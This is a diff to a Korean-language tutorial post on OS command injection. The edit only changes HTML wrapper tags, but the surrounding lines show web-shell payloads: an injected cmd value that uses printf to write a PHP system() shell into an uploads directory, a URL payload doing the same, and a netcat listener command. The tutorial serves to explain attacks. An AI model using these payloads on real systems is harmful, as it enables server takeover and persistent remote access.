@@ -298,7 +298,7 @@ nc -lvp 5252 -k -v
 </div>
 
 # OS Command Injection으로 인한 웹쉘 업로드
-
+<div class="notice--primary" markdown="1">
 ```
 ?cmd=127.0.0.1;printf '<?=system($_GET[0])?>' > /var/www/html/uploads/shell.php
 ```
@@ -379,7 +379,7 @@ OS Command Injection이 존재하는 구간에 사용되는 명령어가 wget, c
 http://test.com?cmd=<?%3Dsystem($_GET[cmd]);?> -o /var/www/html/uploads/webshell.php
 ```
 
-<hr>
+</div>
 
 # 리눅스와 윈도우의 차이
 지금까지는 리눅스 계열에서의 관점으로 설명했다. 전체적인 틀은 똑같으나, 윈도우에서 사용하는
